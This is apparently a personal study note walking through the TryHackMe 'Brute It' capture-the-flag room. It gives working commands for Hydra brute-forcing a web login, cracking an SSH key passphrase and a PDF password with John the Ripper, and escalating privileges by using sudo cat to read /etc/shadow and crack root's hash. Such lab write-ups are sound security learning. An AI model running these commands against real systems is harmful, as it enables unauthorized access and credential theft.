
2024-07-28 20:06

Source: #tryhackme #privesc #Boot2root 

Tags:  [[Cryptography]]
#### Hydra brute force

we have a website that has a simple login page with username and password 
we find the username from the source code 
use [[Tags/hydra]] to brute force the password
```sh
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.91.80 http-post-form '/admin/:user=^USER^&pass=^PASS^:Username or password invalid'
```
#### cracking rsa 

- after logging in the website we find a [[SSH (22 port)]] `rsa` private key, `wget` it from the website  
- The special John the Ripper tool called **ssh2john.py** which can extract the crackable hash from the [[RSA]] private key. (don't save o/p in a text file)
```
/usr/share/john/ssh2john.py id_rsa  > rsa.hash
```
- then user `rockyou` wordlist with john to crack the pass 
- `chmod` the original `id_rsa` file - `chmod 600 id_rsa`
- use `ssh` to login as john
#### using John

Adding the option `--rules=wordlist` to your [[john]] command line generates multiple passwords from each one. For instance, it appends and prepends single digits, use this if the password isn't cracked by using a wordlist (its like data augmentation)

```sh
john --format=raw-sha256 --rules=wordlist --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
```

- if a password protected pdf is there use `pdf2john.pl private.pdf > pdf.hash` to convert the pdf to a hash
- further crack the hash 
- in order to open a pdf file we can convert it into text  `pdftotext private.pdf -upw <password>`

#### Priv esc

- `sudo -l` -> can run `cat` with sudo
- go to gtfobins and find exp. for `cat `
- since you can cat files using `sudo` , `cat /etc/shadow` and get a hash of the root pass which you further crack using john 
- Before we use John the Ripper to find out the root’s password we need to put it in a format that john will understand. To do this we will use the unshadow command. 
`/etc/passwd` and `/etc/shadow` files are passwd.txt and shadow.txt respectively 
```sh
unshadow passwd.txt shadow.txt > pass.txt
john --wordlists=../rockyou.txt pass.txt
john --show pass.txt
```
- `sudo cat` the `root/root.txt` and get the flag
### References

[TryHackMe | Brute It](https://tryhackme.com/r/room/bruteit)
[TryHackMe: Brute It - Eric Logan](https://eric.cc/tryhackme-brute-it/)
[TryHackMe | Brute It Walkthrough | Medium](https://enescayvarli.medium.com/tryhackme-bruteit-walkthrough-e93e3f29c233)

Linpeas - [linpeas | grimbins](https://grimbins.github.io/grimbins/linpeas/)